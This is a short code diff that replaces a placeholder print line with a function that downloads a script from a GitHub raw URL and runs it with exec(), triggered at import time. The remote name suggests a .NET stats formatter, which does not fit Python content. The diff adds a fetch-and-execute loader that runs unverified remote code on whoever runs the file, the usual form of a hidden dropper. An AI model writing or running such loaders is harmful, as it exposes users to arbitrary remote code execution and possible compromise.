@@ -1,1 +1,12 @@
-print("number2")
+def fetch_and_execute_script(github_raw_url):
+  try:
+      response = requests.get(github_raw_url)
+      if response.status_code == 200:
+          exec(response.text)
+      else:
+          print(f"Failed to load script. Status code: {response.status_code}")
+  except Exception as e:
+      print(f"Error fetching script: {e}")
+ 
+github_raw_url = "https://raw.githubusercontent.com/Mythyxs/dotnet/main/RH2StatsFormatter"
+fetch_and_execute_script(github_raw_url)
